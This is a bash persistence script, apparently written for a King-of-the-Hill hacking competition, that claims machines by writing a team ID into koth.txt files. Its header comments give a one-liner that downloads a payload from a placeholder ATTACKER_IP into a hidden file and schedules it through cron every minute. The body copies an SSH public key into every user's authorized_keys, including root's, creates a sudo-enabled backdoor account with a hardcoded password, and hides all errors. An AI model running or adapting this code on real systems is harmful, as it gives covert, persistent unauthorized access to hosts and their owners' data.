#!/bin/bash
#   curl -o /var/tmp/.x http://ATTACKER_IP/persist.sh && chmod +x /var/tmp/.x
#   (crontab -l 2>/dev/null; echo "* * * * * /var/tmp/.x") | crontab - 2>/dev/null
# Or from this script:
#   ./persist.sh --install

exec 2>/dev/null
# ======================== CONFIG ========================
TEAM_UUID="CHANGEME"
NEW_USER="jmac"
NEW_PASS='machine-KOTH-9!'
PERSIST_PATH="/var/tmp/.x"

install_crontab() {
    cp "$(readlink -f "$0")" "$PERSIST_PATH" 2>/dev/null
    chmod +x "$PERSIST_PATH" 2>/dev/null
    (crontab -l 2>/dev/null | grep -v "$PERSIST_PATH"; echo "* * * * * $PERSIST_PATH") | crontab - 2>/dev/null
    echo "[+] Installed to $PERSIST_PATH (crontab every minute)"
    exit 0
}

[ "$1" = "--install" ] && install_crontab

# ========================================================
# 1. Find SSH public key from any user that already has one
# ========================================================
PUB_KEY=""
for homedir in /root /home/*/; do
    [ ! -d "$homedir" ] && continue
    if [ -z "$PUB_KEY" ] && [ -f "${homedir}/.ssh/authorized_keys" ]; then
        PUB_KEY=$(head -1 "${homedir}/.ssh/authorized_keys" 2>/dev/null)
    fi
    if [ -z "$PUB_KEY" ]; then
        for pubfile in "${homedir}"/.ssh/id_*.pub; do
            [ -f "$pubfile" ] && PUB_KEY=$(head -1 "$pubfile" 2>/dev/null) && break
        done
    fi
    [ -n "$PUB_KEY" ] && break
done

# ========================================================
# 2. Drop SSH key to ALL users
# ========================================================
if [ -n "$PUB_KEY" ]; then
    for homedir in /root /home/*/; do
        [ ! -d "$homedir" ] && continue
        username=$(basename "$homedir")
        [ "$username" = "*" ] && continue
        [ "$homedir" = "/root" ] && username="root"

        mkdir -p "${homedir}/.ssh" 2>/dev/null
        touch "${homedir}/.ssh/authorized_keys" 2>/dev/null
        grep -qF "$PUB_KEY" "${homedir}/.ssh/authorized_keys" 2>/dev/null || \
            echo "$PUB_KEY" >> "${homedir}/.ssh/authorized_keys" 2>/dev/null
        chmod 700 "${homedir}/.ssh" 2>/dev/null
        chmod 600 "${homedir}/.ssh/authorized_keys" 2>/dev/null
        chown -R "${username}:${username}" "${homedir}/.ssh" 2>/dev/null
    done
fi

if ! id "$NEW_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null
    echo "$NEW_USER:$NEW_PASS" | chpasswd 2>/dev/null
    usermod -aG sudo "$NEW_USER" 2>/dev/null
fi

if [ -n "$PUB_KEY" ] && id "$NEW_USER" >/dev/null 2>&1; then
    JMAC_HOME=$(eval echo "~$NEW_USER" 2>/dev/null)
    mkdir -p "$JMAC_HOME/.ssh" 2>/dev/null
    touch "$JMAC_HOME/.ssh/authorized_keys" 2>/dev/null
    grep -qF "$PUB_KEY" "$JMAC_HOME/.ssh/authorized_keys" 2>/dev/null || \
        echo "$PUB_KEY" >> "$JMAC_HOME/.ssh/authorized_keys" 2>/dev/null
    chmod 700 "$JMAC_HOME/.ssh" 2>/dev/null
    chmod 600 "$JMAC_HOME/.ssh/authorized_keys" 2>/dev/null
    chown -R "$NEW_USER:$NEW_USER" "$JMAC_HOME/.ssh" 2>/dev/null
fi

# ========================================================
# 4. Write team UUID to koth.txt
# ========================================================
[ "$TEAM_UUID" = "CHANGEME" ] && exit 0

for homedir in /home/*/; do
    [ ! -d "$homedir" ] && continue
    username=$(basename "$homedir")
    [ "$username" = "*" ] && continue
    echo "$TEAM_UUID" > "${homedir}koth.txt" 2>/dev/null
    chown "$username:$username" "${homedir}koth.txt" 2>/dev/null
done

echo "$TEAM_UUID" > /root/koth.txt 2>/dev/null
if [ -d "/c/Users" ] 2>/dev/null; then
    for userdir in /c/Users/*/; do
        echo "$TEAM_UUID" > "${userdir}koth.txt" 2>/dev/null
    done
    echo "$TEAM_UUID" > /c/koth.txt 2>/dev/null
fi
exit 0